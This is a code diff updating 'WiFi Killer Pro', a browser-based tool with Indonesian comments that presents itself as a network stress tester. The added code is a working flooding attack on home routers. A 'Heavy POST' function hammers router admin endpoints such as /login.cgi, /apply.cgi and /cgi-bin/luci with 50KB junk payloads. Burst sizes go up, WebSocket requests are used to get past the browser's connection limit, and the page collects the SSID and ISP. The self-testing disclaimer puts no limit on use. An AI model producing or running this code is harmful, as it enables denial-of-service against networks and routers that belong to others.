@@ -7,14 +7,15 @@
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
 <meta name="mobile-web-app-capable" content="yes">
-<meta name="description" content="WiFi Killer Pro v3.0 — Real Network Stress Tester">
-<title>WiFi Killer Pro v3.0 — Real Network Stress Tester</title>
+<meta name="description" content="WiFi Killer Pro v3.1 — Real Network Stress Tester">
+<title>WiFi Killer Pro v3.1 — Real Network Stress Tester</title>
 
 <link rel="preconnect" href="https://cdnjs.cloudflare.com">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="preconnect" href="https://api.ipify.org">
+<link rel="preconnect" href="https://ipapi.co">
 <link rel="preconnect" href="https://ipwho.is">
+<link rel="preconnect" href="https://api.ipify.org">
 
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer">
 
@@ -165,7 +166,7 @@ body::after {
 }
 
 /* ============================================================================
-   5. SCROLL REVEAL
+   5. SCROLL REVEAL (FIXED: No remove active)
    ============================================================================ */
 .reveal {
   opacity: 0;
@@ -184,7 +185,7 @@ body::after {
 .reveal-delay-4 { transition-delay: 0.16s; }
 
 /* ============================================================================
-   6. GLASS CARD
+   6. GLASS CARD (FIXED: Removed content-visibility & contain)
    ============================================================================ */
 .glass-card {
   background: var(--grad-card);
@@ -194,9 +195,8 @@ body::after {
   box-shadow: var(--shadow-card);
   position: relative;
   overflow: hidden;
-  contain: layout style paint;
-  content-visibility: auto;
-  contain-intrinsic-size: 200px;
+  /* content-visibility: auto; <-- DIHAPUS KARENA BIKIN BUG HILANG */
+  /* contain: layout style paint; <-- DIHAPUS KARENA BIKIN BUG HILANG */
 }
 
 .glass-card::before {
@@ -1197,7 +1197,7 @@ body::after {
       <div>
         <h1 class="title">WIFI KILLER PRO</h1>
         <p class="subtitle">Real Network Stress Tester</p>
-        <span class="version-badge">v3.0.0</span>
+        <span class="version-badge">v3.1.0</span>
       </div>
     </div>
   </div>
@@ -1215,7 +1215,7 @@ body::after {
       diverifikasi di log server modul Anda. <strong>Bukan simulasi.</strong><br><br>
       Gunakan <strong>hanya untuk testing modul WiFi sendiri</strong>. Browser tidak dapat
       mengakses <code>raw UDP socket</code>, jadi yang dikirim adalah
-      <code>HTTP GET</code> via Image/Fetch/WebSocket/Iframe — semuanya <strong>request nyata</strong>.
+      <code>HTTP POST/GET</code> via Image/Fetch/WebSocket/Iframe — semuanya <strong>request nyata</strong>.
     </p>
   </div>
 
@@ -1334,6 +1334,7 @@ body::after {
       </label>
       <select class="config-select" id="methodSelect">
         <option value="mixed" selected>Mixed (Semua Metode)</option>
+        <option value="heavy">Heavy POST (Bikin Lag)</option>
         <option value="image">Image Preload Only</option>
         <option value="fetch">Fetch no-cors Only</option>
         <option value="websocket">WebSocket Only</option>
@@ -1422,7 +1423,7 @@ body::after {
       </button>
     </div>
 
-    <!-- LOCAL IP + ISP -->
+    <!-- LOCAL IP -->
     <div class="info-row">
       <span class="info-label">
         <i class="fas fa-network-wired"></i>
@@ -1431,6 +1432,16 @@ body::after {
       <span class="info-value loading" id="infoIp">Detecting...</span>
     </div>
 
+    <!-- SSID (Bawah Local IP) -->
+    <div class="info-row isp-row">
+      <span class="info-label">
+        <i class="fas fa-wifi"></i>
+        SSID (WiFi Name)
+      </span>
+      <span class="info-value loading" id="infoSsid">Detecting...</span>
+    </div>
+
+    <!-- ISP (Device) (Bawah SSID) -->
     <div class="info-row isp-row">
       <span class="info-label">
         <i class="fas fa-building"></i>
@@ -1439,7 +1450,7 @@ body::after {
       <span class="info-value loading" id="infoIspDevice">Detecting...</span>
     </div>
 
-    <!-- ROUTER IP + ISP -->
+    <!-- GATEWAY -->
     <div class="info-row">
       <span class="info-label">
         <i class="fas fa-router"></i>
@@ -1448,6 +1459,7 @@ body::after {
       <span class="info-value loading" id="infoGateway">Detecting...</span>
     </div>
 
+    <!-- ISP (Router) -->
     <div class="info-row isp-row">
       <span class="info-label">
         <i class="fas fa-tower-cell"></i>
@@ -1456,7 +1468,7 @@ body::after {
       <span class="info-value loading" id="infoIspRouter">Detecting...</span>
     </div>
 
-    <!-- PUBLIC IP + ACTIVE TARGET -->
+    <!-- PUBLIC IP -->
     <div class="info-row">
       <span class="info-label">
         <i class="fas fa-globe"></i>
@@ -1579,7 +1591,7 @@ body::after {
   /* ==========================================================================
      KONSTANTA
      ========================================================================== */
-  var APP_VERSION = '3.0.0';
+  var APP_VERSION = '3.1.0';
   var MAX_LOG_LINES = 300;
   var MAX_STORED_LOG_LINES = 500;
 
@@ -1599,6 +1611,7 @@ body::after {
     localIp: '-',
     gateway: '-',
     publicIp: '-',
+    ssid: '-',
     ispDevice: '-',
     ispRouter: '-',
     connType: '-',
@@ -1649,6 +1662,7 @@ body::after {
     el.refreshPoolBtn     = document.getElementById('refreshPoolBtn');
     el.refreshNetBtn      = document.getElementById('refreshNetBtn');
     el.infoIp             = document.getElementById('infoIp');
+    el.infoSsid           = document.getElementById('infoSsid');
     el.infoGateway        = document.getElementById('infoGateway');
     el.infoPublicIp       = document.getElementById('infoPublicIp');
     el.infoIspDevice      = document.getElementById('infoIspDevice');
@@ -1840,7 +1854,7 @@ body::after {
   }
 
   /* ==========================================================================
-     SCROLL REVEAL
+     SCROLL REVEAL (FIXED: Hanya add, tidak pernah remove)
      ========================================================================== */
   function initReveal() {
     var revealElements = document.querySelectorAll('.reveal');
@@ -1858,8 +1872,7 @@ body::after {
         var entry = entries[i];
         if (entry.isIntersecting) {
           entry.target.classList.add('active');
-        } else {
-          entry.target.classList.remove('active');
+          // DIHAPUS: entry.target.classList.remove('active'); <-- INI PENYEBAB BUG HILANG SAAT SCROLL
         }
       }
     }, { threshold: 0.1 });
@@ -1910,6 +1923,17 @@ body::after {
         var s = bridge.getPermissionStatus('LOCAL_NETWORK');
         return s === 'granted' || s === true;
       }
+    } catch (e) {}
+    return null;
+  }
+
+  function bridgeGetSSID() {
+    var bridge = detectBridge();
+    if (!bridge) return null;
+    try {
+      if (typeof bridge.getWifiName === 'function') return bridge.getWifiName();
+      if (typeof bridge.getSSID === 'function') return bridge.getSSID();
+      if (typeof bridge.getWifiSSID === 'function') return bridge.getWifiSSID();
     } catch (e) {}
     return null;
   }
@@ -1989,7 +2013,6 @@ body::after {
       setPermStatus(el.permLocalNetStatus, 'granted', 'GRANTED', 'fa-check');
       log('SUCCESS', 'Local Network: GRANTED via bridge');
     } else {
-      // Coba deteksi via connection type
       var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
       if (conn && conn.type) {
         if (conn.type === 'wifi' || conn.type === 'ethernet') {
@@ -2000,7 +2023,6 @@ body::after {
           setPermStatus(el.permLocalNetStatus, 'unknown', conn.type, 'fa-question');
         }
       } else if (navigator.onLine) {
-        // Fallback: asumsikan granted kalau online
         state.localNetGranted = true;
         setPermStatus(el.permLocalNetStatus, 'granted', 'AVAILABLE', 'fa-check');
         log('INFO', 'Local Network: online (asumsi available)');
@@ -2128,11 +2150,11 @@ body::after {
   }
 
   /* ==========================================================================
-     FETCH PUBLIC IP + ISP INFO
+     FETCH PUBLIC IP + ISP INFO (ipapi.co priority 1)
      ========================================================================== */
   function fetchPublicIPAndISP() {
     return new Promise(function (resolve) {
-      log('ISP', 'Fetching public IP from ipify...');
+      log('ISP', 'Fetching public IP & ISP from ipapi.co...');
 
       if (el.infoPublicIp) {
         el.infoPublicIp.textContent = 'Fetching...';
@@ -2147,74 +2169,140 @@ body::after {
         el.infoIspRouter.className = 'info-value loading';
       }
 
-      // Step 1: get public IP via ipify
-      fetch('https://api.ipify.org?format=json', { cache: 'no-store' })
+      // Priority 1: ipapi.co (has 'org')
+      fetch('https://ipapi.co/json/', { cache: 'no-store' })
         .then(function (res) { return res.json(); })
         .then(function (data) {
-          var publicIp = data && data.ip ? data.ip : null;
-          if (!publicIp) throw new Error('No IP in ipify response');
-          state.publicIp = publicIp;
-          log('ISP', 'Public IP: ' + publicIp);
+          if (data && data.ip && (data.org || data.isp)) {
+            state.publicIp = data.ip;
+            var ispName = data.org || data.isp;
+            
+            // Set ISP Device & ISP Router
+            state.ispDevice = ispName;
+            state.ispRouter = ispName;
 
-          if (el.infoPublicIp) {
-            el.infoPublicIp.textContent = publicIp;
-            el.infoPublicIp.className = 'info-value';
+            if (el.infoPublicIp) {
+              el.infoPublicIp.textContent = data.ip;
+              el.infoPublicIp.className = 'info-value';
+            }
+            if (el.infoIspDevice) {
+              el.infoIspDevice.textContent = state.ispDevice;
+              el.infoIspDevice.className = 'info-value isp';
+            }
+            if (el.infoIspRouter) {
+              el.infoIspRouter.textContent = state.ispRouter;
+              el.infoIspRouter.className = 'info-value isp';
+            }
+            
+            log('ISP', 'IP: ' + data.ip + ' | ISP: ' + state.ispDevice);
+            return { success: true };
           }
-
-          // Step 2: get ISP info via ipwho.is
-          return fetch('https://ipwho.is/' + encodeURIComponent(publicIp) + '?fields=ip,success,country,city,connection', { cache: 'no-store' });
+          throw new Error('ipapi.co failed');
         })
-        .then(function (res) { return res.json(); })
-        .then(function (info) {
-          if (!info || info.success === false) {
-            throw new Error('ipwho.is failed');
-          }
-
-          var conn = info.connection || {};
-          var ispName = conn.isp || conn.org || conn.domain || 'Unknown';
-          var orgName = conn.org || conn.isp || conn.domain || 'Unknown';
-          var asn = conn.asn ? ('AS' + conn.asn) : '';
-
-          // ISP Device = ISP name
-          state.ispDevice = ispName + (asn ? ' (' + asn + ')' : '');
-          // ISP Router = org name (biasanya sama tapi bisa beda format)
-          state.ispRouter = orgName + (asn ? ' (' + asn + ')' : '');
-
-          if (el.infoIspDevice) {
-            el.infoIspDevice.textContent = state.ispDevice;
-            el.infoIspDevice.className = 'info-value isp';
-          }
-          if (el.infoIspRouter) {
-            el.infoIspRouter.textContent = state.ispRouter;
-            el.infoIspRouter.className = 'info-value isp';
-          }
-
-          log('ISP', 'ISP Device: ' + state.ispDevice);
-          log('ISP', 'ISP Router: ' + state.ispRouter);
-
-          resolve({
-            publicIp: publicIp,
-            ispDevice: state.ispDevice,
-            ispRouter: state.ispRouter,
-            country: info.country,
-            city: info.city
-          });
+        .catch(function () {
+          // Fallback to ipwho.is
+          log('ISP', 'ipapi.co failed, trying ipwho.is...');
+          return fetch('https://ipwho.is/', { cache: 'no-store' })
+            .then(function (res) { return res.json(); })
+            .then(function (info) {
+              if (info && info.success && info.connection) {
+                state.publicIp = info.ip;
+                var isp = info.connection.isp || info.connection.org || 'Unknown';
+                state.ispDevice = isp;
+                state.ispRouter = isp;
+                
+                if (el.infoPublicIp) {
+                  el.infoPublicIp.textContent = info.ip;
+                  el.infoPublicIp.className = 'info-value';
+                }
+                if (el.infoIspDevice) {
+                  el.infoIspDevice.textContent = state.ispDevice;
+                  el.infoIspDevice.className = 'info-value isp';
+                }
+                if (el.infoIspRouter) {
+                  el.infoIspRouter.textContent = state.ispRouter;
+                  el.infoIspRouter.className = 'info-value isp';
+                }
+                
+                log('ISP', 'IP: ' + info.ip + ' | ISP: ' + state.ispDevice);
+                return { success: true };
+              }
+              throw new Error('ipwho.is failed');
+            });
+        })
+        .catch(function () {
+          // Fallback to ipify
+          log('ISP', 'ipwho.is failed, trying ipify...');
+          return fetch('https://api.ipify.org?format=json', { cache: 'no-store' })
+            .then(function (res) { return res.json(); })
+            .then(function (data) {
+              if (data && data.ip) {
+                state.publicIp = data.ip;
+                state.ispDevice = 'Unknown ISP';
+                state.ispRouter = 'Unknown ISP';
+                
+                if (el.infoPublicIp) {
+                  el.infoPublicIp.textContent = data.ip;
+                  el.infoPublicIp.className = 'info-value';
+                }
+                if (el.infoIspDevice) {
+                  el.infoIspDevice.textContent = state.ispDevice;
+                  el.infoIspDevice.className = 'info-value error';
+                }
+                if (el.infoIspRouter) {
+                  el.infoIspRouter.textContent = state.ispRouter;
+                  el.infoIspRouter.className = 'info-value error';
+                }
+                
+                log('ISP', 'IP: ' + data.ip + ' | ISP: Unknown');
+                return { success: true };
+              }
+              throw new Error('ipify failed');
+            });
+        })
+        .then(function () {
+          resolve(true);
         })
         .catch(function (err) {
-          log('ERROR', 'ISP fetch failed: ' + (err && err.message ? err.message : String(err)));
-          state.ispDevice = 'Unknown';
-          state.ispRouter = 'Unknown';
-          if (el.infoIspDevice) {
-            el.infoIspDevice.textContent = 'Unknown';
-            el.infoIspDevice.className = 'info-value error';
-          }
-          if (el.infoIspRouter) {
-            el.infoIspRouter.textContent = 'Unknown';
-            el.infoIspRouter.className = 'info-value error';
-          }
-          resolve({ error: err.message });
+          log('ERROR', 'All ISP APIs failed: ' + err.message);
+          resolve(false);
         });
     });
+  }
+
+  /* ==========================================================================
+     GET SSID
+     ========================================================================== */
+  function fetchSSID() {
+    var ssid = bridgeGetSSID();
+    if (ssid) {
+      state.ssid = ssid;
+      if (el.infoSsid) {
+        el.infoSsid.textContent = state.ssid;
+        el.infoSsid.className = 'info-value isp';
+      }
+      log('INFO', 'SSID via bridge: ' + state.ssid);
+      return;
+    }
+
+    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (conn && conn.ssid) {
+      state.ssid = conn.ssid;
+      if (el.infoSsid) {
+        el.infoSsid.textContent = state.ssid;
+        el.infoSsid.className = 'info-value isp';
+      }
+      log('INFO', 'SSID via NetworkInformation: ' + state.ssid);
+      return;
+    }
+
+    // Fallback
+    state.ssid = 'Unknown (Browser restriction)';
+    if (el.infoSsid) {
+      el.infoSsid.textContent = state.ssid;
+      el.infoSsid.className = 'info-value error';
+    }
+    log('WARN', 'SSID not accessible via browser.');
   }
 
   /* ==========================================================================
@@ -2250,6 +2338,7 @@ body::after {
     if (el.infoGateway) { el.infoGateway.textContent = 'Detecting...'; el.infoGateway.className = 'info-value loading'; }
 
     loadNetworkInfoAPI();
+    fetchSSID();
 
     detectLocalIP().then(function (ips) {
       if (ips && ips.length > 0) {
@@ -2400,6 +2489,40 @@ body::after {
   }
 
   /* ==========================================================================
+     ATTACK: HEAVY POST (Bikin Router Lag)
+     ========================================================================== */
+  function sendHeavyPost(target, tag) {
+    var start = performance.now();
+    var payload = new Uint8Array(50000); // 50KB payload
+    for (var i = 0; i < payload.length; i++) {
+      payload[i] = 65; // 'A'
+    }
+
+    var paths = ['/', '/login.cgi', '/setup.cgi', '/apply.cgi', '/cgi-bin/luci', '/goform/goform_set_cmd_process'];
+    var path = paths[tag % paths.length];
+
+    fetch(target + path + '?_=' + randomSeed(), {
+      method: 'POST',
+      mode: 'no-cors',
+      cache: 'no-store',
+      credentials: 'omit',
+      body: payload,
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+      }
+    }).then(function () {
+      var elapsed = Math.round(performance.now() - start);
+      log('SUCCESS', '#' + tag + ' [HEAVY POST] → ' + target + path + ' (' + elapsed + 'ms)');
+      state.reached++;
+      updateStats();
+    }).catch(function (err) {
+      var elapsed = Math.round(performance.now() - start);
+      log('WARN', '#' + tag + ' [HEAVY POST] → ' + target + path + ' (' + elapsed + 'ms, ' + (err.name || 'fail') + ')');
+      updateStats();
+    });
+  }
+
+  /* ==========================================================================
      ATTACK: IMAGE
      ========================================================================== */
   function sendImage(target, tag) {
@@ -2465,7 +2588,7 @@ body::after {
   }
 
   /* ==========================================================================
-     ATTACK: WEBSOCKET
+     ATTACK: WEBSOCKET (Bypass limit 6 koneksi)
      ========================================================================== */
   function sendWebSocket(target, tag) {
     var start = performance.now();
@@ -2659,6 +2782,7 @@ body::after {
     }
 
     var m = state.method;
+    if (m === 'heavy')     { sendHeavyPost(target, tag); return; }
     if (m === 'image')     { sendImage(target, tag); return; }
     if (m === 'fetch')     { sendFetch(target, tag); return; }
     if (m === 'websocket') { sendWebSocket(target, tag); return; }
@@ -2666,14 +2790,15 @@ body::after {
     if (m === 'script')    { sendScript(target, tag); return; }
     if (m === 'link')      { sendLink(target, tag); return; }
 
-    var r = tag % 4;
-    if (r === 0)      sendImage(target, tag);
-    else if (r === 1) sendFetch(target, tag);
-    else if (r === 2) sendImage(target, tag);
-    else              sendFetch(target, tag);
+    // MIXED MODE (Heavy POST + WS + Fetch)
+    var r = tag % 5;
+    if (r === 0)      sendHeavyPost(target, tag);
+    else if (r === 1) sendWebSocket(target, tag);
+    else if (r === 2) sendFetch(target, tag);
+    else if (r === 3) sendImage(target, tag);
+    else              sendHeavyPost(target, tag);
 
-    if (tag % 17 === 0) sendWebSocket(target, tag);
-    if (tag % 23 === 0) sendIframe(target, tag);
+    if (tag % 17 === 0) sendIframe(target, tag);
     if (tag % 29 === 0) sendScript(target, tag);
     if (tag % 31 === 0) sendLink(target, tag);
   }
@@ -2686,9 +2811,9 @@ body::after {
     var target = buildTargetUrl();
     if (!target) return;
 
-    var burst = 3;
-    if (state.interval <= 30) burst = 5;
-    if (state.interval <= 10) burst = 8;
+    var burst = 5; // Diperbesar untuk load lebih berat
+    if (state.interval <= 30) burst = 8;
+    if (state.interval <= 10) burst = 12;
 
     for (var i = 0; i < burst; i++) {
       state.attempts++;
